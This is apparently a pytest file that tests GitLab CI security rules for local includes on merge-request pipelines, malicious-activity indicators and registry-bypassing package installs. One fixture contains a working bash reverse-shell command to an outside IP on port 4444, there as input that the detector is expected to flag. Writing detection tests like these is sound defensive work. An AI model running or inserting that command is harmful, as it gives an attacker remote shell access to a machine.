"""Per-rule tests for GitLab CI residual rules:
GL-011 (include: local on MR-triggered pipelines),
GL-025 (pipeline contains malicious-activity indicators),
GL-027 (package install bypasses registry integrity).

GL-011 closes the MR-controlled-include gap (the MR author edits the
included YAML and the pipeline runs that edited config). GL-025 is
the threat-indicator catch-all. GL-027 covers registry-bypass package
sources that GL-021 (lockfile flag) alone can't catch.
"""
from __future__ import annotations

from .conftest import run_check

# ── GL-011 include: local on MR pipeline ────────────────────────────


class TestGL011IncludeLocalOnMR:
    def test_fails_when_mr_pipeline_includes_local_file(self):
        cfg = """
        include:
          - local: 'ci/build.yml'
        workflow:
          rules:
            - if: '$CI_PIPELINE_SOURCE == "merge_request_event"'
        stages: [build]
        build_job:
          stage: build
          image: alpine:3.19.1
          script: [make]
          timeout: 30 minutes
        """
        f = run_check(cfg, "GL-011")
        assert not f.passed

    def test_passes_when_mr_pipeline_uses_project_include(self):
        cfg = """
        include:
          - project: 'org/ci-templates'
            ref: 'a1b2c3d4e5f6071829304a1b2c3d4e5f60718293'
            file: '/templates/build.yml'
        workflow:
          rules:
            - if: '$CI_PIPELINE_SOURCE == "merge_request_event"'
        stages: [build]
        build_job:
          stage: build
          image: alpine:3.19.1
          script: [make]
          timeout: 30 minutes
        """
        f = run_check(cfg, "GL-011")
        assert f.passed

    def test_passes_when_pipeline_does_not_run_on_mr(self):
        cfg = """
        include:
          - local: 'ci/build.yml'
        workflow:
          rules:
            - if: '$CI_COMMIT_BRANCH == "main"'
        stages: [build]
        build_job:
          stage: build
          image: alpine:3.19.1
          script: [make]
          timeout: 30 minutes
        """
        f = run_check(cfg, "GL-011")
        assert f.passed


# ── GL-025 malicious-activity indicators ────────────────────────────


class TestGL025MaliciousActivity:
    def test_fails_on_reverse_shell_pattern(self):
        cfg = """
        stages: [run]
        run_job:
          stage: run
          image: alpine:3.19.1
          script:
            - bash -i >& /dev/tcp/198.51.100.7/4444 0>&1
          timeout: 30 minutes
        """
        f = run_check(cfg, "GL-025")
        assert not f.passed

    def test_passes_on_clean_pipeline(self):
        cfg = """
        stages: [build]
        build_job:
          stage: build
          image: alpine:3.19.1
          script: [make]
          timeout: 30 minutes
        """
        f = run_check(cfg, "GL-025")
        assert f.passed


# ── GL-027 package source integrity ────────────────────────────────


class TestGL027PackageSourceIntegrity:
    def test_fails_on_pip_install_git_url(self):
        cfg = """
        stages: [build]
        build_job:
          stage: build
          image: python:3.12.1-slim
          script:
            - pip install git+https://github.com/example/tool.git
          timeout: 30 minutes
        """
        f = run_check(cfg, "GL-027")
        assert not f.passed

    def test_passes_with_lockfile_install(self):
        cfg = """
        stages: [build]
        build_job:
          stage: build
          image: python:3.12.1-slim
          script:
            - pip install --require-hashes -r requirements.txt
          timeout: 30 minutes
        """
        f = run_check(cfg, "GL-027")
        assert f.passed
